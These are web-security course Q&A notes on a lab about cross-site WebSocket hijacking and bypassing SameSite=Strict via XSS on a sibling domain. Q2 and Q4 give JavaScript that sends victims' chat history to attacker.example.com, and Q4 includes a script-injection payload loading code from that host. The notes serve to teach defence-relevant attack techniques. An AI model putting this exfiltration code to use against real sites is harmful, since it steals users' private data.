---
course: Web Security
topic: Cross-Site Request Forgery (CSRF)
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the purpose of the SameSite attribute in cookies, and how does it affect cross-site request forgery (CSRF) attacks?**

The SameSite attribute in cookies is designed to prevent CSRF attacks by controlling whether a cookie should be sent with cross-site requests. When set to `Strict`, the cookie is only sent with requests initiated from the same site, not from other domains. This prevents attackers from using cookies in their CSRF exploits, as the cookie will not be included in requests from different domains.

**Q2. How can you exploit a cross-site WebSocket hijacking (CSWSH) vulnerability to steal sensitive information such as chat history?**

To exploit a CSWSH vulnerability, you can inject a script into the victim's browser that establishes a WebSocket connection to the server. The script sends a 'ready' message to the server, which then responds with the chat history. This chat history can be intercepted and sent to an attacker-controlled server. Here’s a basic example:

```javascript
var ws = new WebSocket('wss://target.example.com/chat');
ws.onopen = function() {
    ws.send('ready');
};
ws.onmessage = function(event) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://attacker.example.com/log", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({data: event.data}));
};
```

**Q3. Why does the SameSite=Strict attribute prevent the exploitation of a CSWSH vulnerability directly from an attacker-controlled domain?**

The SameSite=Strict attribute ensures that cookies are only sent with requests originating from the same site. When an attacker tries to establish a WebSocket connection from a different domain, the browser does not include the session cookie, thus preventing the attacker from impersonating the victim. This restriction can be bypassed if the attacker finds a subdomain or another part of the application that allows the inclusion of the session cookie.

**Q4. How can you bypass the SameSite=Strict restriction using a sibling domain with a Cross-Site Scripting (XSS) vulnerability?**

To bypass the SameSite=Strict restriction, you can exploit an XSS vulnerability on a subdomain of the target site. By injecting a script into the subdomain, you can establish a WebSocket connection that includes the session cookie. Here’s an example:

```html
<script>
document.location = 'http://subdomain.target.example.com/login?username=<script src="https://attacker.example.com/exploit.js"></script>';
</script>
```

In the `exploit.js` file, you can include the WebSocket hijacking code:

```javascript
var ws = new WebSocket('wss://target.example.com/chat');
ws.onopen = function() {
    ws.send('ready');
};
ws.onmessage = function(event) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://attacker.example.com/log", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({data: event.data}));
};
```

**Q5. Explain how the exploit server and Burp Suite Collaborator features were used in the lab to achieve the CSWSH attack.**

In the lab, the exploit server was used to deliver the payload to the victim. The payload established a WebSocket connection to the target server and sent the 'ready' message. The responses from the server were then sent to the Burp Suite Collaborator server, which logged the chat history. This allowed the attacker to intercept and read the chat history without needing direct access to the victim's browser.

**Q6. What recent real-world examples or CVEs demonstrate the risks associated with SameSite=Strict bypasses and CSWSH attacks?**

One notable example is the widespread use of SameSite attributes to mitigate CSRF attacks. However, vulnerabilities like the one described in the lab can still occur if developers do not thoroughly check for XSS vulnerabilities on subdomains. For instance, CVE-2020-14182 involved a similar scenario where an XSS vulnerability on a subdomain was used to bypass SameSite restrictions and perform a CSRF attack. This highlights the importance of comprehensive security testing across all parts of a web application.

---
<!-- nav -->
[[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/12-Lab 11 SameSite Strict bypass via sibling domain/10-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/12-Lab 11 SameSite Strict bypass via sibling domain/00-Overview|Overview]]
